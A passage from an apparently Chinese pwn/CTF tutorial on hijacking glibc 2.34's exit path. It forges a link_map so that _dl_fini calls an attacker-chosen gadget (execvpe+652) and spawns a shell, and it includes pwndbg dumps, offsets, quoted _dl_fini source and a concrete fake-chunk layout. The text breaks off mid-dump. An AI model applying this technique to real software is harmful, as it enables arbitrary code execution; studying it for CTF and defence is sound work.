<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_rtld_global</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">struct</span> rtld_global *) <span class="number">0x7f56e43b9040</span> &lt;_rtld_global&gt;</span><br><span class="line">    <span class="comment">//以下是结构体信息的展开，pwndbg为我们做了整理</span></span><br><span class="line">pwndbg&gt; p _rtld_global</span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  _dl_ns = &#123;&#123;</span><br><span class="line">      _ns_loaded = <span class="number">0x7f56e43ba220</span>,				<span class="comment">//#1</span></span><br><span class="line">      _ns_nloaded = <span class="number">4</span>,						<span class="comment">//#2</span></span><br><span class="line">      _ns_main_searchlist = <span class="number">0x7f56e43ba4e0</span>,</span><br><span class="line">      _ns_global_scope_alloc = <span class="number">0</span>,</span><br><span class="line">      _ns_global_scope_pending_adds = <span class="number">0</span>,</span><br><span class="line">      libc_map = <span class="number">0x7f56e4382000</span>,</span><br><span class="line">      _ns_unique_sym_table = &#123;</span><br><span class="line">        lock = &#123;</span><br><span class="line">          mutex = &#123;</span><br><span class="line">            __data = &#123;</span><br><span class="line">              __lock = <span class="number">0</span>,</span><br><span class="line">              __count = <span class="number">0</span>,</span><br><span class="line">              __owner = <span class="number">0</span>,</span><br><span class="line">              __nusers = <span class="number">0</span>,</span><br><span class="line">              __kind = <span class="number">1</span>,</span><br><span class="line">              __spins = <span class="number">0</span>,</span><br><span class="line">              __elision = <span class="number">0</span>,</span><br><span class="line">              __list = &#123;</span><br><span class="line">                __prev = <span class="number">0x0</span>,</span><br><span class="line">                __next = <span class="number">0x0</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            __size = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">16</span> times&gt;, <span class="string">&quot;\001&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">22</span> times&gt;,</span><br><span class="line">            __align = <span class="number">0</span></span><br><span class="line">          &#125;</span><br><span class="line">....    </span><br><span class="line">  <span class="comment">//展开数据会很多，但是只是对链表个节点信息的汇总</span></span><br></pre></td></tr></table></figure>
<p>我们需要关注的是，</p>
<p>​	#1，_ns_loaded = 0x7f56e43ba220,	这是整个链表的头节点，</p>
<p>​	#2， _ns_nloaded = 4, 这里知名个这个链表的节点个数，在 exit 后面加载的检查中，会要求_ns_nloaded 链表的节点不少于 3 个</p>
<p>（后面我会给出相关的源码）</p>
<p>然后对于每个节点，都是 link_map 结构体，我们利用第一个节点做一下简单说明 (省略了部分无关的数据)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> link_map *)<span class="number">0x7f56e43ba220</span></span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  l_addr = <span class="number">94172888551424</span>,</span><br><span class="line">  l_name = <span class="number">0x7f56e43ba7c8</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">  l_ld = <span class="number">0x55a655922000</span>,</span><br><span class="line">  l_next = <span class="number">0x7f56e43ba7d0</span>,			<span class="comment">//#3</span></span><br><span class="line">  l_prev = <span class="number">0x0</span>,							</span><br><span class="line">  l_real = <span class="number">0x7f56e43ba220</span>,			<span class="comment">//#3</span></span><br><span class="line">  l_ns = <span class="number">0</span>,</span><br><span class="line">  l_libname = <span class="number">0x7f56e43ba7b0</span>,</span><br><span class="line">  l_info = &#123;<span class="number">0x0</span>, <span class="number">0x55a655922010</span>, <span class="number">0x55a6559220f0</span>, <span class="number">0x55a6559220e0</span>, <span class="number">0x0</span>, <span class="number">0x55a655922090</span>, <span class="number">0x55a6559220a0</span>, <span class="number">0x55a655922120</span>, <span class="number">0x55a655922130</span>, <span class="number">0x55a655922140</span>, <span class="number">0x55a6559220b0</span>, <span class="number">0x55a6559220c0</span>, <span class="number">0x55a655922020</span>, <span class="number">0x55a655922030</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55a655922100</span>, <span class="number">0x55a6559220d0</span>, <span class="number">0x0</span>, <span class="number">0x55a655922110</span>, <span class="number">0x55a655922160</span>, <span class="number">0x55a655922040</span>, <span class="number">0x55a655922060</span>, <span class="number">0x55a655922050</span>, <span class="number">0x55a655922070</span>, <span class="number">0x55a655922000</span>, <span class="number">0x55a655922150</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55a655922180</span>, <span class="number">0x55a655922170</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55a655922160</span>, <span class="number">0x0</span>, <span class="number">0x55a6559221a0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55a655922190</span>, <span class="number">0x0</span> &lt;repeats <span class="number">25</span> times&gt;, <span class="number">0x55a655922080</span>&#125;,			<span class="comment">//#4</span></span><br><span class="line">  l_phdr = <span class="number">0x55a65591d040</span>,</span><br><span class="line">......</span><br><span class="line">  l_direct_opencount = <span class="number">1</span>,</span><br><span class="line">  l_type = lt_executable,</span><br><span class="line">  l_relocated = <span class="number">1</span>,</span><br><span class="line">  l_init_called = <span class="number">1</span>,					<span class="comment">//#5</span></span><br><span class="line">  l_global = <span class="number">1</span>,</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们需要关注的：</p>
<p>​	#3，l_next = 0x7f56e43ba7d0, ，指向下一个 link_map 的指针，我们就是通过修改这个，将下一个节点劫持为我们伪造的 link_map</p>
<p>​	#4 , l_real = 0x7f56e43ba220 , 指向的的自身的地址，这里也是后面需要检查的地方。</p>
<p>​	#5,  l_init_called = 1, 简单说，就是为了绕过检查。</p>
<p>下面是_dl_fini 函数的源码（我已经删除了部分注释及代码，源码路径为 glibc2.34/elf/dl-fini。c）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">maps</span>[<span class="title">nloaded</span>];</span>				</span><br><span class="line"></span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">	  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">	    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">	    <span class="keyword">if</span> (l == l-&gt;l_real)						<span class="comment">//检查节点的地址是否跟自己结构体保存的一致</span></span><br><span class="line">	      &#123;</span><br><span class="line">		assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">		maps[i] = l;</span><br><span class="line">		l-&gt;l_idx = i;</span><br><span class="line">		++i;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">		   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">		++l-&gt;l_direct_opencount;</span><br><span class="line">	      &#125;</span><br><span class="line">	  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">	  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">	  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">			 <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">	  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];			<span class="comment">//l遍历link_map的链表</span></span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)					<span class="comment">//重要的检查点</span></span><br><span class="line">		&#123;</span><br><span class="line">		  l-&gt;l_init_called = <span class="number">0</span>;						</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">		  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">		      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">					    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">					  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">					  ns);</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">			    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();					<span class="comment">//目标位置</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总结下我们需要绕过那些检查</p>
<ol>
<li>
<p>判断 <code>_ns_loaded</code>  链表中至少有三个节点（dl-fini 开始部分通过循环遍历链表，做检查，）</p>
</li>
<li>
<p>检查 <code>l == l-&gt;l_real</code></p>
</li>
<li>
<p>检查 <code>l-&gt;l_init_called &gt; 8</code>            这个其实跟数据的处理有关</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_relocated:<span class="number">1</span>;	<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_global:<span class="number">1</span>;	<span class="comment">/* Nonzero if object in _dl_global_scope.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_reserved:<span class="number">2</span>;	<span class="comment">/* Reserved for internal use.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_phdr_allocated:<span class="number">1</span>; <span class="comment">/* Nonzero if the data structure pointed</span></span><br><span class="line"><span class="comment">					to by `l_phdr&#x27; is allocated.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_soname_added:<span class="number">1</span>; <span class="comment">/* Nonzero if the SONAME is for sure in</span></span><br></pre></td></tr></table></figure>
<p>在 lunk_map 结构体中，这个变量是 4 字节，与结构体开始位置的偏移量为 0x31c。pwndbg 帮我们解释了数据的结果，这里的数据要大于 8，我们不妨之际设置为 9. 不同节点可以有所差异，下面是一个结果为 1 的数据</p>
<p><img data-src="https://cdn.jsdelivr.net/gh/dreamkecat/blog_img//blog_img/image-20220922124850825.png" alt="image-20220922124850825"></p>
<p>以及一个不为 1 的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> link_map *)<span class="number">0x7f56e43ba7d0</span></span><br><span class="line">$<span class="number">5</span> = &#123;</span><br><span class="line">  l_addr = <span class="number">140725148598272</span>,</span><br><span class="line">  l_name = <span class="number">0x7ffd207e4371</span> <span class="string">&quot;linux-vdso.so.1&quot;</span>,</span><br><span class="line">  l_ld = <span class="number">0x7ffd207e43e0</span>,</span><br><span class="line">  l_next = <span class="number">0x7f56e4382000</span>,</span><br><span class="line">  l_prev = <span class="number">0x7f56e43ba220</span>,</span><br><span class="line">  l_real = <span class="number">0x7f56e43ba7d0</span>,</span><br><span class="line">...</span><br><span class="line">  l_relocated = <span class="number">1</span>,</span><br><span class="line">  l_init_called = <span class="number">0</span>,</span><br><span class="line">  l_global = <span class="number">0</span>,</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/wx <span class="number">0x7f56e43ba7d0</span>+<span class="number">0x31c</span></span><br><span class="line"><span class="number">0x7f56e43baaec</span>:	<span class="number">0x00000005</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>检查 <code>l-&gt;l_info[DT_FINI_ARRAY] != NULL</code> ，unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</p>
</li>
</ol>
<p>​	DT_FINI_ARRAY 宏定义为 26，DT_FINI_ARRAYSZ 宏定义为 28，所以 l_info [26], 以及 l_info [28] 不能是 null (28 是因为 i 会影响到函数 ((fini_t) array [i]) (); 调用)</p>
<p>下面我们具体说说如何伪造，我选择利用修改第三节点的 l_next 指针，指向一个 chunk, 并在 chunk 上部署我们伪造的 link_map. 这里依赖任意地址写，可通过 largebin attack 实现，或者其他漏洞造成的可以任意地址写堆地址。第三节点的指针在哪？_rtld_global 符号并不在 libc 文件，而是在 ld.so 文件中，我们要泄露出程序的 ld 基址，pwndbg 为我们提供了一个函数求偏移量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line"><span class="number">0x7f56e43b9040</span>-&gt;<span class="number">0x7f56e4382018</span> is <span class="number">-0x37028</span> bytes (<span class="number">-0x6e05</span> words)</span><br></pre></td></tr></table></figure>
<p>由此我们就知道了需要向哪里写入 chunk.</p>
<p>接下来就是重点，我们如何伪造 link_map.</p>
<p>因为原来的链表中只有 4 个节点，而我们伪造的 link_map 有恰是第四个，所以，l_next 就是 0，l_prve 无所谓，直接写 0 即可。l_real 就是我们的伪造的 link_map 的开始地址，也是我们修改后的第三节点的 l_next 的值。这几个值离 link_map 的首地址很近，可以很直接的看出偏移量。接下来就是 l_info 的伪造。l_info [26] 不为 0，这是结构体内的数组，distance 可以得到 info [26] info [28] 关于节点地址的偏移量，同样我们可以得到上面提到的 l_init_called 的偏移量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_info[<span class="number">26</span>]</span><br><span class="line"><span class="number">0x7f56e43ba220</span>-&gt;<span class="number">0x7f56e43ba330</span> is <span class="number">0x110</span> bytes (<span class="number">0x22</span> words)</span><br><span class="line">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_info[<span class="number">28</span>]</span><br><span class="line"><span class="number">0x7f56e43ba220</span>-&gt;<span class="number">0x7f56e43ba340</span> is <span class="number">0x120</span> bytes (<span class="number">0x24</span> words)</span><br><span class="line">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_init_called</span><br><span class="line"><span class="number">0x7f56e43ba220</span>-&gt;<span class="number">0x7f56e43ba53c</span> is <span class="number">0x31c</span> bytes (<span class="number">0x63</span> words)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>重点来了，info 这连个位置我们写入什么数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  l_info = &#123;<span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x0</span>, <span class="number">0x55a656f072f8</span>, <span class="number">0x8</span>, <span class="number">0x7f56e4244cec</span> &lt;__execvpe+<span class="number">652</span>&gt;, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55a656f072e0</span>, <span class="number">0x0</span>, <span class="number">0x55a656f072e8</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">			    (ElfW(Addr) *) (l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val/ <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();					<span class="comment">//目标位置</span></span><br></pre></td></tr></table></figure>
<p>这是一个比较通用的 info，0x7f56e4244cec &lt;__execvpe+652&gt; 是我们想要执行的函数。</p>
<p>我们再看源码的相关部分，正常情况下，exit 使用的就是第四个节点的 l_info 的数据，也就是使用我们伪造的 info。</p>
<p>sizeof (ElfW (Addr)) = 8，为了方便解释，我们将这里 l-&gt;l_info [DT_FINI_ARRAYSZ] 的数据记为 ptr，ptr-&gt;d_un.d_ptr, 其实就是 ptr+0x8 所指向的数据。ptr 是我们要伪造的数据，他是堆中的一个可控制的位置。我们想要执行一次就可以获得 shell，我们不妨让 i =1, 然后我们需要在 ptr+8 的位置写入的就是 1*8=8</p>
<p>我们还要确定的是 arry 数组。(l-&gt;l_addr+ l-&gt;l_info [DT_FINI_ARRAY]-&gt;d_un.d_ptr);</p>
<p>l-&gt;addr 其实就是我们伪造的 link_map 开始的位置，个人喜欢将这里写为 0，然后将 l_info [26] 写入另外一个地址，两者加起来就是数组的初始位置。我们记录这个地址为 ptr_a, 这个就会给 arry 赋值，然后	arry [i]	====&gt;&gt;  就是调用 ptr_a +8*i 位置的函数。也就是我们的后门。</p>
<p>提供一个构造的布局，</p>
<p>在 <code>fake+0x110</code>  写入一个 ptr_a，且 ptr_a+0x8 处有 ptr，ptr 处写入的是最后要执行的函数地址.</p>
<p>在 <code>fake+0x120</code>  写入一个 ptr，且 ptr+0x8 处是 <code>i*8</code> 。</p>
<p>我选择的是 <code>fake+0x110</code>  写入 <code>fake+0x40</code> ，在 <code>fake+0x48</code>  写入 <code>fake+0x58</code> ，在 <code>fake+0x58</code>  写入 shell</p>
<p>我选择在 <code>fake+0x120</code>  写入 <code>fake+0x48</code> ，在 <code>fake+0x50</code>  处写入 8.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tel <span class="number">0x55a656f072a0</span>(fake) <span class="number">40</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55a656f072a0</span> ◂— <span class="number">0x0</span>							<span class="comment">//l_addr</span></span><br><span class="line">... ↓     <span class="number">4</span> skipped</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55a656f072c8</span> —▸ <span class="number">0x55a656f072a0</span> ◂— <span class="number">0x0</span>				<span class="comment">//l_real</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55a656f072d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55a656f072d8</span> ◂— <span class="number">0x41</span> </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55a656f072e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x55a656f072e8</span> —▸ <span class="number">0x55a656f072f8</span> —▸ <span class="number">0x7f56e4244cec</span> (execvpe+<span class="number">652</span>) ◂— mov    rdx, r12</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x55a656f072f0</span> ◂— <span class="number">0x8</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x55a656f072f8</span> —▸ <span class="number">0x7f56e4244cec</span> (execvpe+<span class="number">652</span>) ◂— mov    rdx, r12</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x55a656f07300</span> ◂— <span class="number">0xa</span> /</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x55a656f07308</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x55a656f07310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x55a656f07318</span> ◂— <span class="number">0x41</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x55a656f07320</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">6</span> skipped</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x55a656f07358</span> ◂— <span class="number">0x41</span></span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│  <span class="number">0x55a656f07360</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">6</span> skipped</span><br><span class="line"><span class="number">1f</span>:<span class="number">00f</span>8│  <span class="number">0x55a656f07398</span> ◂— <span class="number">0x41</span> </span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│  <span class="number">0x55a656f073a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">21</span>:<span class="number">0108</span>│  <span class="number">0x55a656f073a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">22</span>:<span class="number">0110</span>│  <span class="number">0x55a656f073b0</span> —▸ <span class="number">0x55a656f072e0</span> 	<span class="comment">//l_info[26]</span></span><br><span class="line"><span class="number">23</span>:<span class="number">0118</span>│  <span class="number">0x55a656f073b8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">24</span>:<span class="number">0120</span>│  <span class="number">0x55a656f073c0</span> —▸ <span class="number">0x55a656f072e8</span>  <span class="comment">//l_info[28]</span></span><br><span class="line"><span class="number">25</span>:<span class="number">0128</span>│  <span class="number">0x55a656f073c8</span> ◂— <span class="number">0xa</span> </span><br><span class="line"><span class="number">26</span>:<span class="number">0130</span>│  <span class="number">0x55a656f073d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">27</span>:<span 